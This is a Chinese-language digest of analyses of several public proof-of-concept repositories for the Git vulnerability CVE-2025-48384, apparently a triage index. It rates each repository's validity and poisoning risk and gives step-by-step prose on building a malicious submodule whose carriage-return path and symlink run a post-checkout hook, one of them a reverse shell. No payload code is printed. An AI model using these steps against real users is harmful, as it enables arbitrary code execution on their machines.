**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

